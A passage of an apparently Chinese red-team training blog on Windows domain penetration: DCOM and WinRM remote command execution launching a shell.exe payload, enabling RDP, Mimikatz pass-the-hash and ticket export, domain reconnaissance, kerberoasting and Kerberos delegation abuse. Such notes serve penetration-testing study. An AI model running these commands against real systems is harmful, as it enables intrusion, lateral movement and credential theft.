<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">•<span class="variable">$com</span> = <span class="selector-attr">[Type]</span>::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="string">&quot;192.168.52.138&quot;</span>)</span><br><span class="line">•<span class="variable">$obj</span> = <span class="selector-attr">[System.Activator]</span>::CreateInstance(<span class="variable">$com</span>)</span><br><span class="line">•<span class="variable">$item</span> = <span class="variable">$obj</span><span class="selector-class">.item</span>()</span><br><span class="line">•<span class="variable">$item</span><span class="selector-class">.Document</span><span class="selector-class">.Application</span><span class="selector-class">.ShellExecute</span>(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c c:\shell.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>调用Excel.Application远程执行命令<br>通过PowerShell与DCOM进行远程交互，创建Excel.Application对象的实例</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">•<span class="variable">$com</span> =</span><br><span class="line"><span class="selector-attr">[activator]</span>::CreateInstance(<span class="selector-attr">[type]</span>::GetTypeFromprogID(<span class="string">&quot;Excel.Application&quot;</span>,<span class="string">&quot;192.168.52.138&quot;</span>))</span><br><span class="line">•<span class="variable">$com</span><span class="selector-class">.DisplayAlerts</span> = <span class="variable">$false</span></span><br></pre></td></tr></table></figure>

<p>然后执行如下命令，我们就可以调用该对象的”DDEInitiate”方法在远程主机上启动进程</p>
<p>•$com.DDEInitiate(“cmd.exe”,”/c C:\shell.exe”)</p>
<p>利用工具<br><a target="_blank" rel="noopener" href="https://gitlab.com/theepicpowner/dcom_av_exec">https://gitlab.com/theepicpowner/dcom_av_exec</a><br>Impacket – dcomexec.py<br>•python3 ./dcomexec.py [domain/]username:password@ip     //创建一个交互式shell<br>•python3 ./dcomexec.py [domain/]username:password@ip command     //执行命令</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711165544101.png" alt="image-20220711165544101"></p>
<hr>
<p><strong>内网横向—Winrm</strong></p>
<p>WinRM 指的是Windows远程管理服务，通过远程连接winRM模块可以操作windows命令行，默认监听端口5985（HTTP）&amp;5986 (HTTPS)，在2012及以后默认开启。winRM横向移动同时适用于工作组和域环境。<br>利用条件<br>•通信的双方都需要开启WinRM服务<br>•服务端防火墙允许WinRM服务端口通信<br>•WinRM通信两端配置要求<br>远程命令执行<br>•winrs -r:192.168.86.114 -u:192.168.86.114\administrator -p:123456!@#$% whoami<br>•winrs -r:192.168.86.114 -u:192.168.86.114\administrator -p:123456!@#$% cmd</p>
<p>•CS自带了一些用于横向移动的功能，可以在目标中选中主机进行攻击。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711165905203.png" alt="image-20220711165905203"></p>
<p>利用工具:<br>winrmdll<br>•<a target="_blank" rel="noopener" href="https://github.com/mez-0/winrmdll">https://github.com/mez-0/winrmdll</a><br>WSMan-WinRM，使用WSMan.Automation COM对象通过WinRM执行远程命令。<br>•<a target="_blank" rel="noopener" href="https://github.com/bohops/WSMan-WinRM">https://github.com/bohops/WSMan-WinRM</a><br>开启远程主机3389<br>如果目标开启了WinRM可以利用PeekABoo工具使目标开启3389<br>•<a target="_blank" rel="noopener" href="https://github.com/Viralmaniar/PeekABoo">https://github.com/Viralmaniar/PeekABoo</a><br>CS自带了一些用于横向移动的功能，可以在目标中选中主机进行攻击。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711165936638.png" alt="image-20220711165936638"></p>
<hr>
<p><strong>内网横向—RDP</strong></p>
<p>RDP协议<br>RDP，Remote Desktop Protocol，远程桌面协议，该协议是对国际电信联盟发布的一个国际标准的多通道会议协议 T.120 的一个扩展。远程桌面协议让用户（客户端或称 “本地电脑”）连上提供微软终端机服务的电脑（服务器端或称 “远程电脑”）。大部分的 Windows、Linux、FreeBSD、Mac OS X 都有相应的客户端。远程桌面协议在服务端默认监听 TCP 3389 端口的数据。远程桌面协议为用户提供了通过网络连接远程登录到另一台计算机的图形界面。判断是否开启RDP<br>•REG QUERY “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /v PortNumber</p>
<p>RDP 服务的启动<br>如果发现 3389 并没有开启，我们使用以下方式开启它。修改注册表启动先通过修改注册表来设置一下允许远程桌面连接：<br>•REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br>然后可以再配置一下防火墙，设置为允许远程桌面连接，命令：<br>•netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in localport=3389 action=allow<br>通过 Metasploit 模块启动<br>我们可以使用 post/windows/manage/enable_rdp 模块对目标主机快速完成上述配置：<br>•use post/windows/manage/enable_rdpset session 1exploit</p>
<p>利用哈希传递登录 RDP 远程桌面<br>Windows Server 2012 R2 采用了新版的 RDP 远程桌面协议，在这个新版协议中有一个 ”受限管理员”（Restricted Admin）的特性。相信渗透测试人员和系统管理员都会对这个特性有足够的兴趣，因为通过这个特性，我们可以实现哈希传递攻击并成功登录远程桌面。在抓取到的 Hash 无法破解的情况下，如果目标主机开启了 “Restricted Admin Mode” 也行，那么我们便可以使用 Hash 来直接实现 RDP 远程登录。Restricted Admin Mode 在 Windows 8.1 和 Windows Server<br>2012 R2 上默认开启。我们在渗透过程中可以通过修改注册表的方式开启目标主机的 Restricted Admin Mode，值为 0 代表开启，值为 1 代表关闭：<br>•REG ADD “HKLM\System\CurrentControlSet\Control\Lsa” /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /fREG query “HKLM\System\CurrentControlSet\Control\Lsa” | findstr “DisableRestrictedAdmin” # 查看是否成功开启</p>
<p>Mimikatz<br>攻击机上使用 Mimikatz 进行哈希传递，大致原理就是哈希传递成功后执行<br>•mimikatz.exe # 需要管理员权限<br>•privilege::debug<br>•sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d “/run:mstsc.exe /restrictedadmin”</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711170242511.png" alt="image-20220711170242511"></p>
<h2 id="云-安-全-介-绍"><a href="#云-安-全-介-绍" class="headerlink" title="云 安 全 介 绍"></a>云 安 全 介 绍</h2><p><strong>云安全相关</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711170311867.png" alt="image-20220711170311867"></p>
<p><strong>云账号AK泄露</strong></p>
<p>•API凭证（即阿里云AccessKey）是用户访问内部资源最重要的身份凭证。用户调用API时的通信加密和身份认证会使用API凭证.<br>•API凭证是云上用户调用云服务API、访问云上资源的唯一身份凭证。<br>•API凭证相当于登录密码，用于程序方式调用云服务API.</p>
<p><strong>k8s configfile泄露</strong></p>
<p>kubeconfig文件所在的位置: $HOME/.kube/config<br>Kubeconfig文件包含有关Kubernetes集群的详细信息，包括它们的位置和凭据。云厂商会给用户提供该文件,以便于用户可以通过kubectl对集群进行管理. 如果攻击者能够访问到此文件（如办公网员工机器入侵、泄露到Github的代码等），就可以直接通过API Server接管K8s集群，带来风险隐患。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711170447952.png" alt="image-20220711170447952"></p>
<p><strong>Master节点SSH登录泄露</strong></p>
<p>常见的容器集群管理方式是通过登录Master节点或运维跳板机，然后再通过kubectl命令工具来控制k8s。云服务器提供了通过ssh登陆的形势进行登陆master节点.若Master节点SSH连接地址泄漏,攻击者可对ssh登陆进行爆破,从而登陆上ssh,控制集群.</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711170519084.png" alt="image-20220711170519084"></p>
<p><strong>容器组件未鉴权服务</strong></p>
<p>Kubernetes架构下常见的开放服务指纹如下，注:前六个重点关注: 一旦被控制可以直接获取相应容器、相应节点、集群权限的服务<br>•kube-apiserver: 6443, 8080<br>•kubectl proxy: 8080, 8081<br>•kubelet: 10250, 10255, 4149<br>•dashboard: 30000<br>•docker api: 2375<br>•etcd: 2379, 2380<br>•kube-controller-manager: 10252<br>•kube-proxy: 10256, 31442<br>•kube-scheduler: 10251<br>•weave: 6781, 6782, 6783</p>
<p>假如用户想在集群里面新建一个容器集合单元, 流程如下:<br>•用户与 kubectl进行交互,提出需求(例: kubectl create -f pod.yaml)<br>•kubectl 会读取 ~/.kube/config 配置，并与 apiserver 进行交互，协议：http/https<br>•apiserver 会协同 ETCD, kube-controller-manager, scheduler 等组件准备下发新建容器的配置给到节点，协议：http/https<br>•apiserver 与 kubelet 进行交互，告知其容器创建的需求，协议：http/https；<br>•kubelet 与Docker等容器引擎进行交互，创建容器，协议：http/unix socket.<br>•容器在集群节点上创建成功</p>
<p><strong>Kube-Hunter扫描漏洞</strong><br>•kube-hunter是一款用于寻找Kubernetes集群中的安全漏洞扫描器<br>•<a target="_blank" rel="noopener" href="https://github.com/aquasecurity/kube-hunter">https://github.com/aquasecurity/kube-hunter</a><br><strong>CDK</strong><br>•CDK是一款为容器环境定制的渗透测试工具，在已攻陷的容器内部提供零依赖的常用命令及PoC/EXP。集成Docker/K8s场景特有的 逃逸、横向移动、持久化利用方式，插件化管理。<br>•<a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK/wiki/CDK-Home-CN">https://github.com/cdk-team/CDK/wiki/CDK-Home-CN</a></p>
<h1 id="域渗透与免杀对抗"><a href="#域渗透与免杀对抗" class="headerlink" title="域渗透与免杀对抗"></a>域渗透与免杀对抗</h1><h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p><strong>域信息收集—域相关概念</strong></p>
<p>域英文叫DOMAIN——域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域，每个域都有自己的安全策略，以及它与其他域的安全信任关系。如果企业网络中计算机和用户数量较多时，要实现高效管理，就需要windows域。</p>
<p>活动目录是由组织单元、域（domain）、域树（tree）、森林（forest）构成的层次结构。域作为最基本的管理单元，同时也是最基层的容器，它可以对员工、计算机等基本数据进行存储在一个活动目录中可以根据需要建立多个域，比方说“甲公司”的财务科、人事科、销售科就可以各建一个域，因为这几个域同属甲公司，所以就可以将这几个域构成一棵域树并交给域树管理，这棵域树就是甲公司。又因为，甲公司、乙公司、丙公司都归属A集团，那么为了让A集团可以更好地管理这三家子公司，就可以将这三家公司的域树集中起来组成域森林（即A集团）。因此A集团可以按“子公司（域树）→部门→员工”的方式进行层次分明的管理。活动目录这种层次结构使企业网络具有极强的扩展性，便于组织、管理以及目录定位。</p>
<hr>
<p><strong>域信息收集—判断是否有域</strong></p>
<p>搜集完本机相关信息后，接下来，就要判断当前内网是否有域。如果有，需要判断所控主机是否在域内。下面讲解几种方法:<br>1．使用 ipconfig 命令<br>执行如下命令，可以查看网关 IP 地址、DNS 的 IP 地址、本地地址是否和 DNS 服务器为同一网段、域名等。<br>•ipconfig /all</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716203815914.png" alt="image-20220716203815914"></p>
<p>2．查看系统详细信息<br>执行如下命令，域即域名，登录服务器为域控制器。如果域显示为WORKGROUP，表示当前服务器不在域内。当前域名为 hacke.testlab。<br>•Systeminfo</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716203844602.png" alt="image-20220716203844602"></p>
<p>3．查询当前登录域及登录用户信息<br>执行如下命令，工作站域 DNS 名称显示域名（如果显示为 WORKGROUP，则表示非域环境）。登录域表明当前用户是域用户登录还是本地用户登录，此处表明当前用户是域用户登录。<br>•net config workstation</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716203923311.png" alt="image-20220716203923311"></p>
<hr>
<p><strong>域信息收集–收集域内基础信息</strong></p>
<p>确定了当前内网拥有的域，并且所控制的主机在域里面，就可以进行域内相关信息的收集了。因为这些查询命令本质上都是通过 LDAP 协议去域控制器上查询的，查询时候需要经过权限认证，只有域用户才有这个权限，所以本地用户是无法运行以下命令的（system 权限用户除外。在域里面，除了普通用户，所有机器都有一个机器用户，用户名为机器名加“$”。<br>system 用户对应的就是域里面的机器用户，所以 system 权限用户是可以运行以下查询命令的）</p>
<p>1．查询域<br>查询域的命令如下：<br>•net view /domain </p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204044999.png" alt="image-20220716204044999"></p>
<p>2．查询此域内所有计算机<br>执行如下命令，可以通过查询得到的主机名来对主机角色进行初步判断，如图所示。例如，“dev”可能是开发服务器，“web”或者 app 可能是 Web 服务，“NAS”可能是存储服务器，“fileserver”可能是文件服务器等。<br>•net view /domain:XXX</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204123482.png" alt="image-20220716204123482"></p>
<p>3．查询域内所有用户组列表<br>执行如下命令，查询域内所有用户组列表:<br>•net group /domain<br>可以看到，该域含有 13 个组。系统自带的常见组如下。<br>•Domain Admins：域管理员组。<br>•Domain Computers：域内机器。<br>•Domain Controllers：域控制器。<br>•Domain Guest：域访客组，权限较低。<br>•Domain Users：域用户。<br>•Enterprise Admins：企业系统管理员用户。<br>在默认情况下，Domain Admins 和 Enterprise Admins 对域内所有域控制器有完全控制权限。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204208559.png" alt="image-20220716204208559"></p>
<p>4．查询所有域成员计算机列表<br>执行如下命令，查询所有域成员计算机列表：<br>•net group “domain computers” /domain </p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204241961.png" alt="image-20220716204241961"></p>
<p>5．获取域密码信息<br>执行如下命令，获得域密码策略设置、密码长短、错误锁定等信息:<br>•net accounts /domain </p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204433198.png" alt="image-20220716204433198"></p>
<p>6．获取域信任信息<br>执行如下命令，获取域信任信息：<br>•nltest /domain_trusts</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204456003.png" alt="image-20220716204456003"></p>
<hr>
<p><strong>域信息收集–查找域控制器</strong></p>
<p>1．查看域内控制器的机器名<br>执行如下命令，可以看到域控制器机器名为 DC<br>•nltest /DCLIST:XXX<br>2．查看域控制器的主机名<br>执行如下命令，可以看到域控制器主机名为 dc，<br>•Nslookup -type=SRV _ldap._tcp<br>3．查看当前时间<br>一般时间服务器为主域控制器。执行如下命令，<br>•net time /domain</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204623816.png" alt="image-20220716204623816"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204633565.png" alt="image-20220716204633565"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204646974.png" alt="image-20220716204646974"></p>
<p>4．查看域控制器组<br>执行如下命令，查看域控制器组。有一台域控制器的机器名为 DC，<br>•net group “Domain Controllers” /domain<br>在真实环境中，一般存在两台或两台以上的域控制器，其目的是：一旦主域控制器发生故障，备用的域控制器可以使域内服务验证正常进行。执行如下命令，可以看到域控制器的机器名为 DC:<br>•netdom query pdc</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204740517.png" alt="image-20220716204740517"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204752387.png" alt="image-20220716204752387"></p>
<p>扫描内网中同时开放389和53端口的机器。<br>•端口：389<br>•服务：LDAP、ILS<br>•说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口<br>•端口：53<br>•服务：Domain Name Server（DNS）<br>•说明：53端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。</p>
<hr>
<p><strong>域信息收集–获取域内的用户和管理员信息</strong></p>
<p>查询所有域用户列表<br>1．向域控制器进行查询<br>执行如下命令，向域控制器 DC 进行查询。域内存在四个用户，krbtgt 是用来创建票据授予服务（TGS）加密的密钥，它可以实现多种对域内持久化权限对方法，后面会一一讲解。<br>•net user /domain</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204933241.png" alt="image-20220716204933241"></p>
<p>2．获取域内用户详细信息<br>执行如下命令，可以获取域内用户详细信息，常见参数包括用户名、描述信息、SID、域名、状态，<br>•wmic useraccount get /all</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205031212.png" alt="image-20220716205031212"></p>
<p>3．查看存在的用户<br>执行如下命令，可以看到存在四个用户：<br>•dsquery user<br>常用的 dsquery 命令：<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205016936.png" alt="image-20220716205016936"></p>
<p>4．查询域内置本地管理员组用户<br>执行如下命令，可以看到，本地管理员有两个用户和一个组，<br>•net localgroup administrators /domain<br>默认 Domain Admins 组为域内机器的本地管理员用户。在真实环境中，为了方便管理，会有域用户被添加为域机器的本地管理员用户。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205119164.png" alt="image-20220716205119164"></p>
<p>1．查询域管理员用户<br>执行如下命令，可以看到存在两个域管理员用户。<br>•net group “domain admins” /domain</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205205862.png" alt="image-20220716205205862"></p>
<p>2．查询管理员用户组<br>执行如下命令，看到管理员用户为 Administrator，<br>•net group “Enterprise Admins” /domain </p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205242689.png" alt="image-20220716205242689"></p>
<hr>
<p><strong>域信息收集–SPN扫描</strong></p>
<p>SPN扫描<br>不同于常规的tcp/udp端口扫描，由于spn本质就是正常的Kerberos请求，所以扫描是非常隐蔽，日前针对此类扫描的检测暂时也比较少。大部分win系统默认已自带spn探测工具即：setspn.exe 此操作无需管理权限，域内机器执行:<br>•setspn -T target.com -Q <em>/</em><br>可完整查出当前域内所有spn。</p>
<hr>
<p><strong>域信息收集–域内关键组</strong></p>
<p>比如在拿到域控后可以通过重点关注关键部门人员的机器来得到更多的信息。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205639152.png" alt="image-20220716205639152"></p>
<p>以上图为例，我们可以重点关注和监控运维部的用户机器，通常他们的机器上存在大量内网网络拓扑和网络构架信息或者是一些重要的密码本。</p>
<hr>
<p><strong>域信息收集–ADFind</strong></p>
<p>C++实现(未开源)，用于查询域内信息<br><a target="_blank" rel="noopener" href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a><br>常用命令如下：<br>列出域控制器名称：<br>•AdFind -sc dclist<br>查询当前域中在线的计算机：<br>•AdFind -sc computers_active<br>查询当前域中在线的计算机(只显示名称和操作系统)：<br>•AdFind -sc computers_active name operatingSystem</p>
<p>查询当前域中所有计算机(只显示名称和操作系统)：<br>•AdFind -f “objectcategory=computer” name operatingSystem<br>查询域内所有用户：<br>•AdFind -users name<br>查询所有GPO：<br>•AdFind -sc gpodmp</p>
<hr>
<p><strong>域信息收集–利用 PowerShell 收集域信息</strong></p>
<p>PowerShell 是微软推出的一款用于提高管理员对操作系统及应用程序易用性和扩展性的脚本环境，可以说是 cmd.exe 的加强版。PowerShell 作为微软官方推出的脚本语言，在 Windows 系统中的强大众所周知：在系统管理员手中，可以提高 Windows 系统管理工作的自动化程度；在渗透测试人员手中，便于渗透测试人员更好地绕过系统防护和相关反病毒软件。</p>
<p>如果想执行一个 PowerShell 脚本，需要修改 PowerShell 的默认权限为执行权限。PowerShell的常用的执行权限共有四种，具体如下。<br>•Restricted：默认设置，不允许执行任何脚本。<br>•Allsigned：只能运行经过证书验证的脚本。<br>•Unrestricted：权限最高，可以执行任意脚本。<br>•RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名。<br>在 PowerShell 中输入“Get-ExecutionPolicy”，看到为默认 Restricted 权限，</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205843495.png" alt="image-20220716205843495"></p>
<p>将 PowerShell 执行权限改为 Unrestricted，输入“Y”</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205920052.png" alt="image-20220716205920052"></p>
<p>PowerView 是一款依赖 PowerShell 和 WMI 对内网域情况进行查询的常用渗透脚本。<br>PowerView 集成在 PowerSploit 工具包中，下载地址为<br>•<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1%E3%80%82">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1。</a><br>打开一个 PowerShell 窗口，进入 PowerSploit 目录下的 Recon 目录，输入命令<br>•Import-Module .\PowerView.ps1    成功导入脚本</p>
<p>PowerView 中的常用命令如下。<br>•Get-NetDomain：获取当前用户所在的域名称。<br>•Get-NetUser：返回所有用户的详细信息。<br>•Get-NetDomainController：获取所有域控制器。<br>•Get-NetComputer：获取所有域内机器的详细信息。<br>•Get-NetOU：获取域中的 OU 信息。<br>•Get-NetGroup：获取所有域内组和组成员信息。<br>•Get-NetFileServer：根据 SPN 获取当前域使用的文件服务器。<br>•Get-NetShare：获取当前域内所有网络共享。<br>•Get-NetSession：获取在指定服务器存在的会话信息。</p>
<p>•Get-NetRDPSession：获取在指定服务器存在的远程连接信息。<br>•Get-NetProcess：获取远程主机的进程信息。<br>•Get-UserEvent：获取指定用户的日志信息。<br>•Get-ADObject：获取活动目录的对象信息。<br>•Get-NetGPO：获取域所有组策略对象。<br>•Get-DomainPolicy：获取域默认或域控制器策略。<br>•Invoke-UserHunter：用于获取域用户登录计算机及该用户是否有本地管理权限<br>•Invoke-ProcessHunter：查找域内所有机器进程用于找到某特定用户。<br>•Invoke-UserEventHunter：根据用户日志获取某域用户登录过哪些域机器</p>
<hr>
<p><strong>域信息收集–域渗透分析工具 BloodHound</strong></p>
<p>BloodHound 是一个免费的工具。BloodHound 以用图与线的形式将域内用户、计算机、组、会话、ACL 及域内所有相关用户、组、计算机、登录信息、访问控制策略之间的关系直观地展现在 Red Team 成员面前，更便捷地分析域内情况，更快地在域内提升权限。BloodHound 也可以使Blue Team 成员对己方网络系统进行更好的安全检测，以及保证域的安全性。BloodHound 使用图形理论，自动化地在 Active Directory 环境中理清大部分人员之间的关系和细节。使用BloodHound，可以快速地深入了解 AD 中的一些用户关系、哪些用户具有管理员权限、哪些用户有权对任何计算机都拥有管理权限，以及有效的用户组成员信息。<br>Github：<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a><br>使用wiki：<a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/">https://bloodhound.readthedocs.io</a></p>
<h2 id="域横向手法"><a href="#域横向手法" class="headerlink" title="域横向手法"></a>域横向手法</h2><p><strong>域横向移动—ACL</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716210224569.png" alt="image-20220716210224569"></p>
<p>•域控权限（域控目的时是控制运维机）<br>•运维机（运维机目的是内网核心）<br>•内网核心以及核心业务段</p>
<hr>
<p><strong>域横向移动—GPP和SYSVOL中的密码</strong></p>
<p>•GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途<br>•一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。<br>•该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）<br>•接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，位于格式类似于以下的文件夹中：<br>•<code>\\active.local\Policies\&#123;31B2F340-016D-11D2-945F- 00C04FB984F9&#125;\MACHINE\Preferences\Groups\Groups.xml</code></p>
<hr>
<p><strong>域横向移动—Exchange</strong></p>
<p>•Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync<br>•就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限</p>
<hr>
<p><strong>域横向移动-kerberoasting</strong></p>
<p>这种攻击方法主要利用了TGS_REP阶段使用对方NTLM Hash返回的加密数据，通过碰撞加密数据破解用户密码。<br>高效率方法:</p>
<ol>
<li>查询SPN，找到有价值的SPN，需要满足以下条件：</li>
<li>该SPN注册在域用户帐户(Users)下</li>
<li>域用户账户的权限很高</li>
<li>请求TGS</li>
<li>导出TGS</li>
<li>暴力破解<br> •<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></li>
</ol>
<hr>
<p><strong>域横向移动-委派</strong></p>
<p>域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。需要注意的是在域内可以委派的账户有两种，一种是主机账户，另一种是服务账户(域用户通过注册SPN也可以成为服务账号)。<br>Kerberos委派主要分为三种：<br>•非约束委派(Unconstrained Delegation)<br>•约束委派(Constrained Delegation)<br>•基于资源的约束委派(Resource-Based Constrained Delegation)<br>下面简单介绍下Kerberos的各类委派，如何配置，如何发现，实战场景中如何利用。</p>
<hr>
<p><strong>域横向移动-非约束委派</strong></p>
<p>非约束委派<br>当域用户访问域内某服务时，如果该服务开启了非约束委派，用户会主动将自己已转发的的TGT发送服务，而该服务会将用户的TGT保存在内存以备下次重用，然后服务就可以利用该已转发的TGT以用户的身份访问该用户能访问的服务。非约束委派的安全问题就是如果我们找到配置了非约束委派的主机，并且通过一定手段拿下该主机的权限，我们就可以拿到所有访问过该主机用户的TGT。</p>
<p>如何配置和发现非约束委派的主机配置：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716210811336.png" alt="image-20220716210811336"></p>
<p>查找：<br>•AdFind.exe -b “DC=0ne,DC=test” -f  “(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))” cn distinguishedName</p>
<p>利用场景<br>当我们在域内拿到一台配置了非约束委派的主机后，就可以使用mimikatz导出所有票据，若是有其他用户访问过该主机，那么我们就可以通过ptt获取该用户权限。<br>•mimikatz.exe “privilege::debug” “sekurlsa::tickets /export” exit<br>•kerberos::ptt<br>•psexec64.exe \DC2012.0ne.test -accepteula -s cmd<br>当然我们也可以诱导域管访问该主机，例如通过给管理员发诱饵文件修改Desktop.ini，或是outlook等等。</p>
<p>非约束委派+Spooler打印机服务<br>在实战中，被动的非约束委派的利用需要和目标用户交互比较鸡肋。因此可以利用非约束委派+Spooler 打印机服务可以强制指定的主机进行连接。利用原理：利用 Windows 打印系统远程协议 (MS-RPRN) 中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex) 方法强制任何运行了Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。</p>
<p>POC: <a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a><br>在WIN7主机上运行该工具，强制域控向WIN7发起认证，然后导出票据，可以看到已经获取了DC2012$的TGT，符合DCSync的利用条件[域控制器计算机帐户]：<br>•kerberos::ptt xxxx.kirbi</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716211016871.png" alt="image-20220716211016871"></p>
<hr>
<p><strong>域横向移动-约束委派</strong></p>
<p>由于非约束委派的不安全性，微软在windows server2003中引入了约束委派，对Kerberos协议进行了拓展，引入了S4U。其中S4U支持两个子协议：<br>•Service for User to Self(S4U2self)<br>•Service for User to Proxy(S4U2proxy)<br>这两个扩展都允许服务代表用户从KDC请求票证。S4U2self可以代表自身请求针对其自身的Kerberos服务票据(ST)；S4U2proxy可以以用户的名义请求其它服务的ST，约束委派就是限制了S4U2proxy扩展的范围。配置它后，约束委派将限制指定服务可以代表用户去访问服务。该设置需要SeEnableDelegation特权，该特权很敏感，通常仅授予域管理员。约束委派的安全问题就是如果我们找到配置了约束委派的服务账号，并且通过一定手段拿下该服务账号。我们就可以利用这个服务账号代表任意用户进行S4U2self获得一个可转发的票据，然后把获取到的票据用于S42proxy(作为AddtionTicket)，从而获取一个可转发的TGS，服务就可以代替任意用户访问另外一个服务(既被配置的约束委派的服务)。</p>
<p>配置：<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716211151137.png" alt="image-20220716211151137"></p>
<p>查找:<br>•AdFind.exe -b “DC=0ne,DC=test” -f “(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))” cn distinguishedName msds-allowedtodelegateto</p>
